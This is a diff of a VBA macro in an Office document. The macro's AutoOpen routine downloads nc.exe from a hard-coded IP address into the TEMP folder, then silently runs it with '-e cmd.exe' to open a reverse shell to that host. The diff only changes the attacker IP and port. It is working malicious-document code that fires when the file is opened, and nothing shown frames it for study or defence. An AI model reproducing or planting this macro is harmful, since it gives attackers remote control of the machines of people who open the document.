@@ -1,7 +1,7 @@
 Sub AutoOpen()
     Dim strUrl As String
     Dim strPath As String
-    strUrl = "http://192.168.1.65/nc.exe"
+    strUrl = "http://192.168.31.186:8888/nc.exe"
     strPath = Environ("TEMP") & "\nc.exe"
 
     ' Download nc.exe
@@ -19,5 +19,5 @@ Sub AutoOpen()
     End With
 
     ' Execute silently
-    Shell "cmd.exe /c " & strPath & " 192.168.1.65 5555 -e cmd.exe", vbHide
+    Shell "cmd.exe /c " & strPath & " 192.168.31.186 5555 -e cmd.exe", vbHide
 End Sub
